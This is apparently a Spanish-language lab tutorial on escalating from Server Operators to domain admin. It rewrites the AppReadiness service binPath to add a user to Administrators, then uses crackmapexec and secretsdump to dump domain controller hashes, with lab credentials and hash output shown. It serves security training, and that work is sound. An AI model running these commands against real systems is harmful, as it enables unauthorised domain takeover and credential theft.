El [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group permite a los miembros administrar servidores Windows sin necesidad de asignar privilegios de Domain Admin. Es un grupo con privilegios muy altos que puede iniciar sesión localmente en los servidores, incluidos los Domain Controllers.

Ser miembro de este grupo confiere los poderosos privilegios `SeBackupPrivilege` y `SeRestorePrivilege` y la capacidad de controlar servicios locales.

### Querying the AppReadiness Service

Examinemos el servicio `AppReadiness`. Podemos confirmar que este servicio se inicia como SYSTEM utilizando la utilidad `sc.exe`.

```r
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

### Checking Service Permissions with PsService

Podemos usar el visualizador/controlador de servicios [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), que forma parte del paquete Sysinternals, para verificar los permisos en el servicio. `PsService` funciona de manera similar a la utilidad `sc` y puede mostrar el estado y las configuraciones del servicio, y también permite iniciar, detener, pausar, reanudar y reiniciar servicios tanto localmente como en hosts remotos.

```r
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

Esto confirma que el grupo Server Operators tiene el derecho de acceso [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), lo que nos da control total sobre este servicio.

### Checking Local Admin Group Membership

Veamos los miembros actuales del grupo de administradores locales y confirmemos que nuestra cuenta objetivo no está presente.

```r
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

### Modifying the Service Binary Path

Cambiemos la ruta binaria para ejecutar un comando que agregue nuestro usuario actual al grupo de administradores locales predeterminado.

```r
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

### Starting the Service

El inicio del servicio falla, lo cual es esperado.

```r
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### Confirming Local Admin Group Membership

Si verificamos la membresía del grupo de administradores, vemos que el comando se ejecutó con éxito.

```r
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

### Confirming Local Admin Access on Domain Controller

A partir de aquí, tenemos control total sobre el Domain Controller y podríamos recuperar todas las credenciales de la base de datos NTDS, acceder a otros sistemas y realizar tareas de post-explotación.

```r
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

### Retrieving NTLM Password Hashes from the Domain Controller

```r
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```